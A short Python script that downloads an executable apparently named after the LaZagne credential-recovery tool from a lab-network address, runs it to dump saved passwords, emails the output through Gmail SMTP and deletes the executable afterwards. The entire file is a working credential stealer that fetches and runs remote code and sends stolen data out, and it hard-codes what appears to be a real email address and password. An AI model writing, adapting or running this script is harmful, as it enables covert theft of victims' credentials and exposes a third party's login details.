

import requests, subprocess, smtplib,os, tempfile

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://10.0.2.5/evil-files/laZgne.exe")
result = subprocess.check_output("laZgne.exe all",shell=True)
send_mail("scolow2111@ueab.ac.ke", "colo5115", result)
os.remove("laZgne.exe")
